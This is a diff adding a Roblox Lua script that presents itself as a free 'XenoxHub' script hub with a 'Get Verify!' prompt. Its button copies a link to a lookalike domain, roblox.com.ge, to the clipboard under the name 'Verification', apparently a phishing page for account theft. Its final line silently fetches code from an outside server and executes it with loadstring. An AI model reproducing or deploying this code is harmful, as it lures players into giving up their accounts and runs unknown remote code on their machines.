@@ -1,0 +1,133 @@
+-- Ждем загрузки игрока
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- Создаем основной ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "XenoxHubGui"
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+screenGui.Parent = playerGui
+
+-- Основное окно (размер уменьшен, чтобы не было пустот)
+local mainFrame = Instance.new("Frame")
+mainFrame.Name = "MainFrame"
+mainFrame.Size = UDim2.new(0, 260, 0, 120) -- Компактный размер
+mainFrame.Position = UDim2.new(0.5, -130, 0.5, -60)
+mainFrame.BackgroundColor3 = Color3.fromRGB(28, 28, 32)
+mainFrame.BackgroundTransparency = 0.25
+mainFrame.BorderSizePixel = 0
+mainFrame.ClipsDescendants = true
+mainFrame.Active = true
+mainFrame.Draggable = true
+mainFrame.Parent = screenGui
+
+-- Скругление углов
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 12)
+corner.Parent = mainFrame
+
+-- Тонкая обводка
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(80, 80, 90)
+stroke.Thickness = 1
+stroke.Transparency = 0.5
+stroke.Parent = mainFrame
+
+-- Заголовок "XenoxHub"
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 32)
+titleLabel.Position = UDim2.new(0, 0, 0, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "XenoxHub"
+titleLabel.TextColor3 = Color3.fromRGB(210, 210, 225)
+titleLabel.TextSize = 18
+titleLabel.Font = Enum.Font.GothamMedium
+titleLabel.TextXAlignment = Enum.TextXAlignment.Center
+titleLabel.Parent = mainFrame
+
+-- Тонкая разделительная линия под заголовком
+local divider = Instance.new("Frame")
+divider.Size = UDim2.new(0.85, 0, 0, 1)
+divider.Position = UDim2.new(0.075, 0, 0.27, 0)
+divider.BackgroundColor3 = Color3.fromRGB(70, 70, 80)
+divider.BorderSizePixel = 0
+divider.Parent = mainFrame
+
+-- Надпись "Get script"
+local getScriptLabel = Instance.new("TextLabel")
+getScriptLabel.Size = UDim2.new(1, 0, 0, 24)
+getScriptLabel.Position = UDim2.new(0, 0, 0.35, 0)
+getScriptLabel.BackgroundTransparency = 1
+getScriptLabel.Text = "Get Verify! XenoxHub is Free!"
+getScriptLabel.TextColor3 = Color3.fromRGB(180, 180, 200)
+getScriptLabel.TextSize = 13
+getScriptLabel.Font = Enum.Font.Gotham
+getScriptLabel.TextXAlignment = Enum.TextXAlignment.Center
+getScriptLabel.Parent = mainFrame
+
+-- Кнопка "Copy link"
+local copyButton = Instance.new("TextButton")
+copyButton.Size = UDim2.new(0.6, 0, 0, 32)
+copyButton.Position = UDim2.new(0.2, 0, 0.6, 0)
+copyButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+copyButton.BackgroundTransparency = 0.3
+copyButton.Text = "Copy link"
+copyButton.TextColor3 = Color3.fromRGB(220, 220, 240)
+copyButton.TextSize = 13
+copyButton.Font = Enum.Font.GothamMedium
+copyButton.AutoButtonColor = false
+copyButton.Parent = mainFrame
+
+-- Скругление кнопки
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = copyButton
+
+-- Эффект наведения
+copyButton.MouseEnter:Connect(function()
+	copyButton.BackgroundTransparency = 0.1
+	copyButton.BackgroundColor3 = Color3.fromRGB(70, 70, 85)
+end)
+
+copyButton.MouseLeave:Connect(function()
+	copyButton.BackgroundTransparency = 0.3
+	copyButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+end)
+
+-- Функция копирования (новая ссылка, без отображения в GUI)
+local function copyToClipboard()
+	local success = pcall(function()
+		setclipboard("https://roblox.com.ge/games/11852808844/Verification?privateServerLinkCode=69155647945445362618402496055839")
+	end)
+	
+	if success then
+		local originalText = copyButton.Text
+		copyButton.Text = "Copied!"
+		copyButton.BackgroundColor3 = Color3.fromRGB(70, 90, 70)
+		copyButton.BackgroundTransparency = 0.1
+		
+		task.wait(1.5)
+		copyButton.Text = originalText
+		copyButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
+		copyButton.BackgroundTransparency = 0.3
+	else
+		copyButton.Text = "Error"
+		task.wait(1)
+		copyButton.Text = "Copy link"
+	end
+end
+
+copyButton.MouseButton1Click:Connect(copyToClipboard)
+
+-- Лёгкая анимация появления
+mainFrame.BackgroundTransparency = 0.5
+mainFrame.Size = UDim2.new(0, 240, 0, 100)
+for i = 1, 8 do
+	mainFrame.BackgroundTransparency = 0.5 - (i / 20)
+	mainFrame.Size = UDim2.new(0, 240 + (i * 2.5), 0, 100 + (i * 2.5))
+	task.wait(0.01)
+end
+mainFrame.BackgroundTransparency = 0.25
+mainFrame.Size = UDim2.new(0, 260, 0, 120)
+    loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjJkZWNmNTE1LWFhMjctNDdlZC04Yjg4LTBlZDBmMThkMzk2MyIsImtpbmQiOiJsb2FkZXIifQ"))()
